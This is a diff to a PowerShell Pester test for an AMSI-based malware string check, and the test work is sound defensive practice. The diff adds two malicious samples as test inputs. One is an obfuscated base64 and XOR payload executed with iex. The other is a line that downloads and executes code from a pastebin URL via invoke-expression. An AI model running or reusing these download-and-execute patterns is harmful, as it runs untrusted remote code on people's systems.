@@ -18,7 +18,16 @@ Describe "Test-AmsiString" {
 
 	Context "Script contains malware" {
 		It "Should return true" {
-			Test-AmsiString 'Invoke-Expression [System.TExt.Encoding]::Unicode.GetString([Convert]::FromBase64String("SDFSEUHRSHFKEH"))"' | Should be $true
+			$BadScript = '$base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
+						  $bytes = [Convert]::FromBase64String($base64)
+						  $string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
+						  iex $string'
+
+$BadScript = 'invoke-expression (invoke-webrequest http://pastebin.com/raw.php?i=JHhnFV8m)'
+
+			Test-AmsiString $BadScript | Should be $true
+
+
 		}
 	}
 }
